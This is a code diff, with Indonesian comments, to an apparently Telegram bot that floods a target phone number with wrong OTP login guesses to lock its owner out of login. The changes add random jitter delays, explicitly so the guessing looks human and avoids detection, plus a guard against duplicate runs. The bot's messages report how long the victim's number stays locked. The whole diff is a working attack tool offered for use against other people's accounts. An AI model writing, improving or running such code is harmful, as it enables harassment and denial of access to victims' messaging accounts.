@@ -29,9 +29,10 @@ logger = logging.getLogger(__name__)
 
 # State Global
 CONFIG = {}
-ACTIVE_FLOODS = {} # Format: {"+628123456": timestamp_until}
+ACTIVE_FLOODS = {}      # Format: {"+628123456": timestamp_until}
+PROCESSING_FLOODS = set() # PERBAIKAN 2: Mencegah double-click (Race Condition)
+
 FLOOD_ATTACK_MAX_ATTEMPTS = 50
-FLOOD_ATTACK_DELAY_SECONDS = 1.5
 PHONE_REGEX = re.compile(r"^\+\d{7,15}$")
 
 def load_config():
@@ -63,7 +64,7 @@ def get_flood_remaining(phone: str) -> int:
     if not until: return 0
     remaining = int(until - time.monotonic())
     if remaining <= 0:
-        ACTIVE_FLOODS.pop(phone, None)
+        ACTIVE_FLOODS.pop(phone, None) # PERBAIKAN 3: Auto-cleanup memory
         return 0
     return remaining
 
@@ -124,8 +125,9 @@ async def trigger_flood_attack(phone: str) -> tuple:
                 logger.error(f"Error sign-in: {e}")
                 phone_code_hash = None # Reset hash jika ada error aneh
                 
-            # Jeda antar tebakan
-            await asyncio.sleep(FLOOD_ATTACK_DELAY_SECONDS)
+            # PERBAIKAN 1: Jitter Delay (Jeda acak antara 1.2 sampai 2.5 detik)
+            # Membuat pola tembakan terlihat seperti manusia, bukan robot.
+            await asyncio.sleep(random.uniform(1.2, 2.5))
             
     finally:
         await client.disconnect()
@@ -201,36 +203,49 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data.startswith("confirm_flood_"):
         phone = data.replace("confirm_flood_", "")
-        await query.answer("Memulai proses tebak OTP...")
         
-        await query.edit_message_text(
-            f"🔥 **Memproses {phone}...**\n\n"
-            f"Bot sedang menebak kode OTP secara acak untuk memicu pemblokiran. Mohon tunggu...",
-            parse_mode=ParseMode.MARKDOWN
-        )
-
-        seconds, attempts, success, reason = await trigger_flood_attack(phone)
-
-        if success:
-            until_utc = (datetime.utcnow() + timedelta(seconds=seconds)).strftime("%H:%M UTC")
-            text = (
-                f"✅ **Nomor Berhasil Dikunci**\n\n"
-                f"Nomor: `{phone}`\n"
-                f"Durasi: **{format_duration(seconds)}** (Sampai {until_utc})\n"
-                f"Percobaan Salah: {attempts}x\n"
-                f"Status: _{reason}_\n\n"
-                f"🛡️ Tidak ada OTP yang bisa digunakan untuk login selama periode tersebut."
-            )
-        else:
-            text = (
-                f"⚠️ **Proses Tidak Berhasil**\n\n"
-                f"Nomor: `{phone}`\n"
-                f"Percobaan: {attempts}x\n"
-                f"Alasan: **{reason}**"
+        # PERBAIKAN 2: Cek apakah nomor ini sedang diproses
+        if phone in PROCESSING_FLOODS:
+            await query.answer("⏳ Proses untuk nomor ini sedang berjalan. Mohon tunggu!", show_alert=True)
+            return
+            
+        PROCESSING_FLOODS.add(phone)
+        
+        try:
+            await query.answer("Memulai proses tebak OTP...")
+            
+            await query.edit_message_text(
+                f"🔥 **Memproses {phone}...**\n\n"
+                f"Bot sedang menebak kode OTP secara acak untuk memicu pemblokiran. Mohon tunggu...",
+                parse_mode=ParseMode.MARKDOWN
             )
 
-        keyboard = [[InlineKeyboardButton("🔙 Menu Utama", callback_data="main_menu")]]
-        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
+            seconds, attempts, success, reason = await trigger_flood_attack(phone)
+
+            if success:
+                until_utc = (datetime.utcnow() + timedelta(seconds=seconds)).strftime("%H:%M UTC")
+                text = (
+                    f"✅ **Nomor Berhasil Dikunci**\n\n"
+                    f"Nomor: `{phone}`\n"
+                    f"Durasi: **{format_duration(seconds)}** (Sampai {until_utc})\n"
+                    f"Percobaan Salah: {attempts}x\n"
+                    f"Status: _{reason}_\n\n"
+                    f"🛡️ Tidak ada OTP yang bisa digunakan untuk login selama periode tersebut."
+                )
+            else:
+                text = (
+                    f"⚠️ **Proses Tidak Berhasil**\n\n"
+                    f"Nomor: `{phone}`\n"
+                    f"Percobaan: {attempts}x\n"
+                    f"Alasan: **{reason}**"
+                )
+
+            keyboard = [[InlineKeyboardButton("🔙 Menu Utama", callback_data="main_menu")]]
+            await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
+            
+        finally:
+            # Hapus dari antrean setelah selesai atau error
+            PROCESSING_FLOODS.discard(phone)
 
     elif data == "cancel_flood":
         context.user_data['awaiting_phone'] = False
